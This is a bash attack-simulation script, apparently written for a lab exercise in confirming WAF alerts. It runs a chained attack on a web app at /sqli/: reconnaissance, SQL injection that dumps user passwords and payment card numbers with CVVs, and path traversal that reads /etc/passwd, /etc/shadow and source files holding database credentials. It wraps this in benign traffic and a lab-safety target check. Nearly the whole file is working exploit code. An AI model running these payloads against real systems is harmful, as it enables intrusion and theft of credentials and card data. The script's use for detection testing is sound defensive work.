#!/bin/bash
# ============================================================
# SQL Injection + Path Traversal Attack Chain (Direct IP)
# (SQL 注入 + 路径穿越 攻击链 — 直连 IP 版)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Covered scenarios: S4 (alert confirmation / reverse tracing)
# Targets: 91 (Web /sqli/) ←→ 92 (MySQL)
# WAF: network-layer / cloud (not host-simulated)
# Usage: bash attack.sh [WEB_IP] [WEB_PORT]
# ============================================================

set +e

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- 配置 ----------
WEB_IP="${1:-10.66.6.91}"
WEB_PORT="${2:-80}"
WEB_URL="http://${WEB_IP}:${WEB_PORT}"
P="/sqli"

lab_require_attack_target "${WEB_IP}" || exit $?

HTTP()  { curl -s -o /dev/null -w '%{http_code}' "$@"; }
GET()   { curl -s "$@"; }

log()  { echo -e "\033[1;34m[*]\033[0m $*"; }
ok()   { echo -e "\033[1;32m[+]\033[0m $*"; }
fail() { echo -e "\033[1;31m[-]\033[0m $*"; }
hdr()  { echo -e "\n\033[1;33m========== $* ==========\033[0m"; }

# ---------- PHASE 1: 正常业务流量（基线） ----------
phase1_normal_traffic() {
    hdr "PHASE 1: 正常业务流量"

    local -a UAS=(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0.0.0"
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15"
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/128.0"
    )

    HTTP -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: ${UAS[1]}" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: ${UAS[2]}" "${WEB_URL}${P}/page.php?tpl=about"
    HTTP -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/page.php?tpl=contact"

    GET -H "User-Agent: ${UAS[0]}" "${WEB_URL}${P}/search.php?q=mouse" > /dev/null
    GET -H "User-Agent: ${UAS[1]}" "${WEB_URL}${P}/search.php?q=keyboard" > /dev/null
    GET -H "User-Agent: ${UAS[2]}" "${WEB_URL}${P}/search.php?q=cable" > /dev/null

    ok "正常流量注入完成 (7 请求)"
}

# ---------- PHASE 2: 目标侦察 ----------
phase2_recon() {
    hdr "PHASE 2: 目标侦察"

    log "目录枚举"
    local -a paths=(/admin /wp-admin /phpmyadmin /.git/config /.env
                     /backup.sql /config.php /server-status /api/v1
                     /manager/html /console /xmlrpc.php)
    for path in "${paths[@]}"; do
        HTTP -H "User-Agent: Mozilla/5.0 zgrab/0.x" "${WEB_URL}${path}"
    done
    ok "目录枚举完成 (${#paths[@]} 路径)"

    log "应用指纹识别"
    local headers
    headers=$(curl -sI "${WEB_URL}${P}/" 2>/dev/null)
    echo "$headers" | grep -iE "^(Server|X-Powered-By|Set-Cookie):" | head -5
    ok "服务器指纹已获取"

    log "页面结构探测"
    local page_content
    page_content=$(GET "${WEB_URL}${P}/")
    echo "$page_content" | grep -oP '(href|action)="[^"]*"' | sort -u | head -10
    ok "页面入口点已枚举"

    log "参数发现 — 测试 search.php 参数行为"
    HTTP "${WEB_URL}${P}/search.php"
    HTTP "${WEB_URL}${P}/search.php?q="
    HTTP "${WEB_URL}${P}/search.php?q=test&debug=1"
    HTTP "${WEB_URL}${P}/search.php?id=1"
    ok "参数行为探测完成"
}

# ---------- PHASE 3: SQL 注入探测 ----------
phase3_sqli_probe() {
    hdr "PHASE 3: SQL 注入探测"

    log "Step 1: 错误触发 — 单引号"
    local err_result
    err_result=$(GET "${WEB_URL}${P}/search.php?q=test'")
    if echo "$err_result" | grep -qi "SQL\|error\|syntax\|mysql"; then
        ok "SQL 错误信息泄露 — 存在注入点"
    else
        fail "未检测到 SQL 错误"
    fi
    sleep 0.5

    log "Step 2: 列数枚举 — ORDER BY"
    for n in 1 2 3 4 5; do
        local code
        code=$(HTTP "${WEB_URL}${P}/search.php?q=test'+ORDER+BY+${n}--+-")
        if [ "$code" != "200" ]; then
            ok "ORDER BY ${n} 返回 $code — 列数为 $((n-1))"
            break
        fi
        local body
        body=$(GET "${WEB_URL}${P}/search.php?q=test'+ORDER+BY+${n}--+-")
        if echo "$body" | grep -qi "Unknown column\|error"; then
            ok "ORDER BY ${n} 报错 — 列数为 $((n-1))"
            break
        fi
    done
    sleep 0.5

    log "Step 3: UNION SELECT 验证注入 — 读取版本和用户"
    local result
    result=$(GET "${WEB_URL}${P}/search.php?q='+UNION+SELECT+1,version(),user()--+-")
    if echo "$result" | grep -qi "MariaDB\|MySQL\|app_user"; then
        ok "UNION SELECT 成功"
        echo "$result" | grep -oP '<td>[^<]+</td>' | head -6
    else
        fail "UNION SELECT 未返回预期数据"
    fi
    sleep 0.5

    log "Step 4: 表枚举 — information_schema"
    result=$(GET "${WEB_URL}${P}/search.php?q='+UNION+SELECT+1,GROUP_CONCAT(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-")
    if echo "$result" | grep -qi "users\|credentials\|payment"; then
        ok "数据库表枚举成功"
        echo "$result" | grep -oP '<td>[^<]+</td>' | head -6
    fi
    sleep 0.5

    log "Step 5: 数据提取 — users 表"
    result=$(GET "${WEB_URL}${P}/search.php?q='+UNION+SELECT+id,username,password+FROM+users--+-")
    if echo "$result" | grep -q "admin"; then
        ok "用户表数据泄露"
        echo "$result" | grep -oP '<td>[^<]+</td>' | head -15
    fi

    log "Step 6: 数据提取 — payment_cards 表"
    result=$(GET "${WEB_URL}${P}/search.php?q='+UNION+SELECT+id,card_number,cvv+FROM+payment_cards--+-")
    if echo "$result" | grep -q "4111"; then
        ok "支付卡数据泄露"
        echo "$result" | grep -oP '<td>[^<]+</td>' | head -12
    fi

    ok "SQL 注入探测完成"
}

# ---------- PHASE 4: 路径穿越 ----------
phase4_path_traversal() {
    hdr "PHASE 4: 路径穿越 (LFI)"

    log "Step 1: 探测 page.php 参数行为"
    HTTP "${WEB_URL}${P}/page.php?tpl=about"
    HTTP "${WEB_URL}${P}/page.php?tpl=nonexistent"
    HTTP "${WEB_URL}${P}/page.php?tpl=."
    ok "参数行为已确认"

    log "Step 2: 路径深度探测"
    for depth in 3 4 5 6; do
        local traverse=""
        for ((i=0; i<depth; i++)); do traverse+="../"; done
        local result
        result=$(GET "${WEB_URL}${P}/page.php?tpl=${traverse}etc/passwd")
        if echo "$result" | grep -q "root:"; then
            ok "路径穿越成功 — 深度 ${depth} (${traverse}etc/passwd)"
            echo "$result" | head -3
            break
        fi
    done
    sleep 0.5

    log "Step 3: 读取 /etc/shadow"
    GET "${WEB_URL}${P}/page.php?tpl=../../../../../etc/shadow" | head -3
    sleep 0.3

    log "Step 4: 读取应用源码（发现硬编码凭证）"
    local result
    result=$(GET "${WEB_URL}${P}/page.php?tpl=../../../../../var/www/html/sqli/search.php")
    if echo "$result" | grep -q "app_pass\|app_user"; then
        ok "数据库凭证从源码泄露"
    fi

    ok "路径穿越探测完成"
}

# ---------- PHASE 5: 正常搜索触发误报 ----------
phase5_false_positive() {
    hdr "PHASE 5: 正常搜索（含 SQL 关键词 — 潜在误报）"

    GET -H "User-Agent: Mozilla/5.0 Chrome/126.0" \
        "${WEB_URL}${P}/search.php?q=SELECT+brand+keyboard" > /dev/null
    GET -H "User-Agent: Mozilla/5.0 Chrome/126.0" \
        "${WEB_URL}${P}/search.php?q=union+jack+flag+sticker" > /dev/null
    GET -H "User-Agent: HealthCheck/1.0" \
        "${WEB_URL}${P}/search.php?q=SELECT+health" > /dev/null

    ok "误报测试完成 (3 正常搜索含 SQL 关键词)"
}

# ---------- PHASE 6: 攻击后正常流量 ----------
phase6_post_normal() {
    hdr "PHASE 6: 攻击后正常业务流量"

    HTTP -H "User-Agent: Mozilla/5.0 Chrome/126.0" "${WEB_URL}${P}/"
    HTTP -H "User-Agent: Mozilla/5.0 Safari/605.1" "${WEB_URL}${P}/page.php?tpl=about"
    GET -H "User-Agent: Mozilla/5.0 Chrome/126.0" \
        "${WEB_URL}${P}/search.php?q=monitor" > /dev/null
    HTTP -H "User-Agent: Mozilla/5.0 Firefox/128.0" "${WEB_URL}${P}/"
    HTTP "${WEB_URL}/favicon.ico"

    ok "正常流量注入完成"
}

# ---------- 主流程 ----------
main() {
    echo ""
    echo "  ╔══════════════════════════════════════════════╗"
    echo "  ║  SQL 注入 + 路径穿越 攻击链                    ║"
    echo "  ║  目标: ${WEB_URL}${P}/                       ║"
    echo "  ╚══════════════════════════════════════════════╝"
    echo ""

    hdr "连接检查"
    local code
    code=$(HTTP "${WEB_URL}${P}/")
    if [ "$code" = "200" ]; then
        ok "Web 靶机可达 (HTTP $code)"
    else
        fail "Web 靶机不可达 (HTTP $code)"; exit 1
    fi

    local start_time=$SECONDS

    phase1_normal_traffic
    phase2_recon
    phase3_sqli_probe
    phase4_path_traversal
    phase5_false_positive
    phase6_post_normal

    local elapsed=$(( SECONDS - start_time ))

    echo ""
    hdr "攻击链执行完毕"
    ok "耗时: ${elapsed}s"
    ok "攻击路径: 正常流量 → 侦察扫描 → SQLi探测(错误→列数→UNION→数据) → LFI(深度探测→敏感文件) → 误报测试"
    echo ""
    echo "  告警确认验证点 (S4):"
    echo "    S4a: WAF告警(sqli) + nginx(200) + DB查询 → 真阳性"
    echo "    S4b: WAF告警(lfi) + nginx(200) + 文件读取 → 真阳性"
    echo "    S4c: 正常搜索含SQL关键词 + nginx(200) + 无恶意 → 误报"
    echo ""
}

main "$@"
